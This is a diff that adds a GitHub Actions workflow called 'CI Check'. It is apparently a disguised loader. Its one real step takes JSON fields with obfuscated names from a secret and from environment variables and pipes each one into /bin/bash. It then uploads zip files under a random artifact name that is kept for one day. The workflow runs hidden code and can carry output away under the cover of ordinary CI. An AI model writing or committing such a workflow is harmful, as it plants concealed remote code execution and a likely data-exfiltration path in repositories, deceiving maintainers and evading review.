@@ -1,0 +1,27 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          lg345: ${{ secrets.lg345 }}
+        run: |
+          printf '%s' "$lg345" | jq -r .ivwy1602 | /bin/bash
+          echo $hs7704 | jq -r .li0 | /bin/bash
+          printf '%s' "$luri537" | jq -r .b8462 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: k7ZZaUY7
+          path: "*.zip"
+          retention-days: 1
